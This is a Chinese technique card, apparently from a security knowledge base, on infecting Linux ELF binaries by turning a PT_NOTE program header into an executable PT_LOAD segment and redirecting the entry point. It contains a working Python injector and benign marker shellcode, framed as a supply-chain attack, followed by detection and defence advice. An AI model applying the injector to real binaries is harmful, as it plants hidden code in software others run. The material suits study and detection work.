---
id: code-analysis-reverse-linux-elf-pt-note-to-load-injection
title: ELF PT_NOTE 转 PT_LOAD 段劫持：在 program header 中植入 R+X shellcode 并改入口
type: scenario
domain: code-analysis
path: code-analysis/reverse/linux
technique: elf-pt-note-to-pt-load-injection
aliases:
- PT_NOTE 劫持
- ELF 段劫持
- PT_LOAD 注入
- ELF 后门注入
- program header 注入
- e_entry 劫持
- 幻核-8
tags:
- linux
- elf
- pt_note
- pt_load
- program-header
- shellcode
- binary-infection
- supply-chain
- anti-analysis
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V95
  verified_at: '2026-11-05T19:41:51+08:00'
  notes: 已对照原文与37张图核对：PT_NOTE(索引7)→PT_LOAD、p_flags 4→5、sc_offset 0x4000/va 0xc000000、59字节 shellcode 与 OEP 0x401040 patch、hello 15776→16443、运行先 INFECTED 后 hello world 退出码0、/proc/maps 0xc000000 r-xp、检测器四告警均属实；mmap 对齐与寄存器保存说明正确。未验证点：PoC 未本机复跑；原文前文称 NOTE 条目 filesz 0x20/align 8，而图11/25 实际为 0x24/4，卡片未沿用错误数值；原文 injector 末尾增量打印表达式有误，卡片已略去。
---

## 一句话结论

ELF 里 section header 供链接器/调试工具使用，program header 才是内核 `execve` 加载时看的索引；把 program header 中一个无足轻重的 `PT_NOTE` 条目改成 `PT_LOAD`，指向文件末尾追加的 R+X shellcode，并改写 `e_entry` 跳过去，就能让被感染的 ELF 在启动瞬间执行任意代码，而 `file` 与 `readelf -S` 仍显示为正常程序。

## 原理

- **两套索引、两个消费者**：Section Header Table 描述 `.text`、`.data`、`.rodata` 等 section，供链接器、`objdump`、`gdb`、`strip` 使用；Program Header Table 描述 segment（`PT_LOAD`、`PT_DYNAMIC`、`PT_NOTE`、`PT_PHDR` 等），内核加载 ELF 时只解析 program header，完全不碰 section header。两套索引指向同一片文件数据但互不校验，认知差就是攻击面。
- **PT_NOTE 是理想劫持目标**：PT_NOTE 存编译器版本、ABI 标识、Build ID 等元信息，对程序运行没有影响；即使内容缺失或类型改变，内核也不会因此拒绝加载。普通 GCC/Clang 程序通常至少带一个 `.note.gnu.build-id` 或 `.note.gnu.property`。
- **注入动作**：在 program header 表中找到第一个 `PT_NOTE`（Elf64_Phdr 56 字节），把 `p_type` 从 4 改为 1（`PT_LOAD`），`p_flags` 从 R 改为 R|X（0x4 → 0x5），`p_offset` 指向文件末尾追加的 shellcode，`p_vaddr`/`p_paddr` 选一个不与现有段冲突的高地址（示例 `0xc000000`），`p_filesz`/`p_memsz` 设为 shellcode 长度，`p_align` 改为 0x1000；再把 ELF header 偏移 24 的 `e_entry` 改成 shellcode 虚拟地址。总共只改 56 + 8 = 64 字节，但 shellcode 追加会让文件变大。
- **mmap 对齐要求**：`PT_LOAD` 的文件偏移与虚拟地址必须满足 `p_offset % p_align == p_vaddr % p_align`。注入器在追加 shellcode 前计算填充字节，使 shellcode 文件偏移与目标虚拟地址同页（示例 sc_offset=0x4000，vaddr=0xc000000）。
- **shellcode 设计**：先保存 `rax/rcx/rdx/rsi/rdi/r11`（`syscall` 会破坏 rcx/r11；`_start` 在 glibc 初始化时依赖 rdx，丢了会崩），用 `write(1, msg, len)` 打印标记（示例 `INFECTED\n`，9 字节），恢复寄存器，最后 `mov rax, <原 e_entry>; jmp rax` 跳回原入口点，使程序继续正常运行。字符串用 RIP 相对 `lea` 保持位置无关；OEP 用 8 字节占位符 `0x4141414141414141`，注入器在编译后的 shellcode 中定位并 patch 成真实入口地址。
- **为什么能隐藏**：`file` 只看 ELF header 前几个字段和 INTERP 段；`readelf -S` 只读 section header。注入只改 program header 与 `e_entry`，section 表里三个 `.note` section 的类型、地址、大小全部不变，因此常规“看 section”的检查看不出异常。文件大小仅增加 4% 左右（示例 15776 → 16443 字节），肉眼不易察觉。
- **运行时验证**：`/proc/<pid>/maps` 中出现 `0xc000000-0xc01000 r-xp`、文件偏移 0x4000 的映射，说明内核确实按伪造的 PT_LOAD 把 shellcode 映射进内存，且与原程序 0x400000 附近的段互不干扰。
- **边界**：需要目标 ELF 存在 PT_NOTE；修改 `e_entry` 本身很显眼；IMA/EVM 等对 ELF 做签名/完整性校验的环境会检测到任何字节级修改；示例用 `-no-pie` 是为了固定 OEP 绝对地址，PIE 目标需要额外处理基址或改用相对跳转。

## 触发条件

- 目标为 x86_64 ELF（示例为 64 位；32 位 ELF 需改用 Elf32_Phdr 布局），且至少有一个 `PT_NOTE` program header。
- 攻击者能修改最终分发的二进制文件或构建产物（供应链、下载站、镜像、内部制品库等），并有执行权限。
- 目标未启用 IMA/EVM、签名校验或逐字节完整性校验；或攻击者能同时绕过这些校验。
- 示例使用 `-no-pie` 固定地址；非 PIE 目标可直接把原 `e_entry` 绝对地址 patch 进 shellcode 并跳回，PIE 目标需要另行计算运行基址。
- shellcode 长度与追加位置满足 PT_LOAD 页对齐要求，且不与现有段地址冲突。

## 利用步骤

1. 用 `readelf -l` 查看 program header，定位第一个 PT_NOTE 及其文件偏移（`e_phoff + index * e_phentsize`）；记录原 `e_entry`。
2. 编写 shellcode：保存寄存器 → 执行恶意动作 → 恢复寄存器 → 跳回原 `e_entry`；在 OEP 立即数处放 8 字节占位符，编译为原始机器码。
3. 读取目标 ELF，按 Elf64_Ehdr 解析 `e_entry/e_phoff/e_phentsize/e_phnum`；在 program header 表中找 `p_type == 4` 的条目。
4. 将 shellcode 追加到文件末尾；计算填充使 `p_offset % 0x1000 == p_vaddr % 0x1000`，选择一个不与现有段冲突的 `p_vaddr`（示例 0xc000000）。
5. 把该 PT_NOTE 条目改为 PT_LOAD：`p_type=1`、`p_flags=R|X`、`p_offset=sc_offset`、`p_vaddr=p_paddr=sc_vaddr`、`p_filesz=p_memsz=len(shellcode)`、`p_align=0x1000`。
6. 把 shellcode 中的占位符 patch 成原 `e_entry`；把 ELF header 偏移 24 的 `e_entry` 改成 `sc_vaddr`；写出文件并 `chmod +x`。
7. 运行感染后的程序：先执行 shellcode，再跳回原入口继续正常逻辑，退出码保持不变；用 `/proc/<pid>/maps` 验证新 LOAD 段的映射权限与偏移。
8. 验证隐蔽性：`file` 与 `readelf -S` 输出与原始文件一致；`readelf -l` 才能看到 NOTE→LOAD 的类型变化与异常地址。

## PoC

原文给出了完整 Python 注入器与 59 字节 shellcode。关键逻辑（按原文流程归纳，未在本机执行）：

```python
import struct
PT_NOTE, PT_LOAD = 4, 1
PF_R, PF_X = 4, 1
OEP_PLACEHOLDER = 0x4141414141414141

elf = bytearray(open(src, 'rb').read())
e_entry, e_phoff, e_phentsize, e_phnum = struct.unpack_from('<Q', elf, 24)[0], \
    struct.unpack_from('<Q', elf, 32)[0], struct.unpack_from('<H', elf, 54)[0], \
    struct.unpack_from('<H', elf, 56)[0]

# 找到第一个 PT_NOTE
for i in range(e_phnum):
    ph = e_phoff + i * e_phentsize
    if struct.unpack_from('<I', elf, ph)[0] == PT_NOTE:
        break

# 追加 shellcode，按页对齐
sc = bytearray(open('shellcode.bin', 'rb').read())
idx = sc.find(struct.pack('<Q', OEP_PLACEHOLDER))
struct.pack_into('<Q', sc, idx, e_entry)   # patch 原入口点
sc_vaddr = 0xc000000
pad = (sc_vaddr % 0x1000 - len(elf) % 0x1000) % 0x1000
elf.extend(b'\x00' * pad)
sc_offset = len(elf)
elf.extend(sc)

# PT_NOTE -> PT_LOAD
struct.pack_into('<II', elf, ph, PT_LOAD, PF_R | PF_X)
struct.pack_into('<QQQQQQ', elf, ph + 8, sc_offset, sc_vaddr, sc_vaddr,
                 len(sc), len(sc), 0x1000)
struct.pack_into('<Q', elf, 24, sc_vaddr)  # e_entry
open(dst, 'wb').write(elf)
```

shellcode 核心：

```asm
BITS 64
push rax
push rcx
push rdx
push rsi
push rdi
push r11
mov rax, 1              ; write
mov rdi, 1              ; stdout
lea rsi, [rel msg]      ; RIP 相对，位置无关
mov rdx, 9
syscall
pop r11
pop rdi
pop rsi
pop rdx
pop rcx
pop rax
mov rax, 0x4141414141414141   ; 注入器 patch 为原 e_entry
jmp rax
msg: db "INFECTED", 10
```

原文验证：`hello` 15776 字节 → `hello_infected` 16443 字节；运行先输出 `INFECTED` 再输出 `hello world`，退出码 0；`readelf -h` 入口点从 `0x401040` 变为 `0xc000000`；`showmaps_infected` 的 `/proc/self/maps` 出现 `0xc000000-0xc01000 r-xp 00004000`。

## 变体与关联

- **32 位 ELF**：用 Elf32_Ehdr/Elf32_Phdr 布局，`e_entry` 偏移 24（4 字节）、`e_phoff` 偏移 28、`e_phentsize` 偏移 42、`e_phnum` 偏移 44；PT_LOAD 对齐规则相同。
- **不修改 e_entry**：可改为 hook `.init_array` 或 GOT/PLT 等初始化路径，能避开入口点异常检测，但需要改 section/代码内容，会留下其他痕迹；原文仅提及，未实现。
- **静默 shellcode**：只跳回 OEP、不打印任何内容（12 字节），运行行为与原程序完全一致；但 program header 中的微型 LOAD 与入口点异常仍可被静态检测。
- **PIE 目标**：需要把 shellcode 改为基于自身位置计算基址，或让注入代码在运行时定位原 `e_entry`，不能直接使用绝对地址。
- **关联**：section header 清零造成的分析盲区见 [[code-analysis-reverse-linux-elf-section-header-zeroing]]；检测规则见 [[defense-detection-elf-pt-note-hijack]]。

## 检测与防御

- **交叉验证两套索引**：`readelf -l` 检查 program header，尤其 PT_NOTE 数量、PT_LOAD 的 `p_vaddr/p_filesz/p_flags`；与 `readelf -S` 的 `.note.*` section 数量对比，NOTE section 数大于 PT_NOTE 段数即高度可疑。
- **异常 LOAD 段**：检测 `p_filesz` 很小（几十到几百字节）的 PT_LOAD、虚拟地址远离正常映像范围（如 0xc000000）、权限为 R+X 的“数据/元信息”段；同时检查 `e_entry` 是否落在 `.text` 或正常代码段内。
- **完整性校验**：使用 IMA/EVM、代码签名、包管理器签名或发布物哈希校验；任何字节级修改都会改变文件哈希，可阻断该手法。
- **运行时检测**：监控 `/proc/<pid>/maps` 中来自同一文件的额外 R+X 映射、入口点不在主映像的进程；EDR 可检测 execve 前的 ELF 结构异常。
- **供应链防护**：对构建产物做可复现构建与签名，限制制品库写权限，分发前用多套工具（file/readelf/自研规则）交叉审计，不能只依赖 section 视图。
